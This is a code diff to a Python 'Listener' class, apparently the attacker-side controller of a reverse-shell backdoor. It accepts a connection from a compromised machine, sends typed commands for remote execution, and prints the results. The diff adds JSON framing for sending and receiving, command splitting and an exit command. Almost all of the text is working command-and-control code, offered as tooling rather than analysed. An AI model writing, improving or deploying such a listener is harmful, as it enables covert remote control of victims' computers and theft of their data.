@@ -1,4 +1,4 @@
-import socket
+import socket, json
 
 class Listener:
     def __init__(self,ip, port ):
@@ -14,14 +14,31 @@ class Listener:
         self.connection, address =  listener.accept()
         print("[+] Got a connection from" + str(address))
 
+    def reliable_send(self,data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode('utf-8'))
+
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data += self.connection.recv(1024).decode('utf-8')
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
     def execute_remotely(self, command):
-        self.connection.send(command.encode('utf-8'))
+        self.reliable_send(command)
+
+        if command[0] == "exit":
+            self.connection.close()
+            exit()
         # Receive and decode the result from bytes to string
-        return self.connection.recv(1024).decode('utf-8')
+        return self.reliable_receive()
 
     def run(self):
         while True:
-            command = input(">> ")
+            command = input(">> ").split(" ")
             result = self.execute_remotely(command)
             print(result)
 
